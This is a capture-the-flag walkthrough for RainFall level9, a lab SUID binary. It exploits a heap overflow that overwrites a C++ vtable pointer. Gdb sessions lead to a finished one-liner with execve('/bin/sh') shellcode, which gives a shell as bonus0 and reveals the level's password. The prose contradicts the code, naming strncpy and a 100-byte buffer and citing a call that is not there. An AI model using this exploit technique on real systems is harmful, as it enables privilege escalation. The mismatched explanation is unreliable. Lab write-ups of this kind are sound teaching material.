We get in the level9, then we list the files in the home directory:

```
    level9@RainFall:~$ ls -la
    -rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
```
The binary is owned by bonus0 and has the SUID bit set, meaning if it executes any shell, it will run with bonus0's privileges.

We try to execute the binary file to get an idea of what it does exactly:

```
    class N
    {
        public:
            char padding[104];
            int annotation;

        N(int value) 
        {
            *(int**)this = (int*)&vtable;
            annotation = value;
        }

        void setAnnotation(const char* input) 
        {
            memcpy(((char*)this) + 4, input, strlen(input));
        }

        int operator+(const N& other) const 
        {
            return this->annotation + other.annotation;
        }

        int operator-(const N& other) const 
        {
            return this->annotation - other.annotation;
        }

        static int vtable;
    };

    int N::vtable = 0x8048848;

    int main(int argc, char** argv, char** envp) 
    {
        if (argc <= 1) 
        {
            exit(1);
        }

        N* obj1 = new N(5);
        N* obj2 = new N(6);

        obj1->setAnnotation(argv[1]);

        return ((int (*)(N*, N*))(*(int**)obj2))(obj2, obj1);
    }
```

The vulnerability is in setAnnotation which performs strncpy into a 100-byte buffer.

The call to b->doSomething(a) is a virtual call, allowing control flow hijack if the vtable pointer is overwritten.

Step 3: Determine Buffer Offset:

```
    (gdb) run
    Starting program: /home/user/level9/level9 
    [Inferior 1 (process 2640) exited with code 01]
    (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    0x08048682 in main ()
    (gdb) x $eax
    0x41366441:     Cannot access memory at address 0x41366441
```

The offset is 108.

Step 4: Shellcode Payload Construction
We determine the location of the buffer in memory:

```
    (gdb) disas main
    (gdb) b *main+136
    (gdb) run AAAA
    (gdb) x $eax
    0x804a00c => buffer address
```

Payload:

```
    payload = 4 bytes of shellcode address (0x0804a010)
            + shellcode (28 bytes)
            + padding of 76 bytes
            + return address (0x0804a00c)
```

Final exploit:

```
    ./level9 $(python -c "print ('\x10\xa0\x04\x08' + \
    '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + '\x0c\xa0\x04\x08')")
```

Step 5: Get the Flag:

```
    $ whoami
    bonus0
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```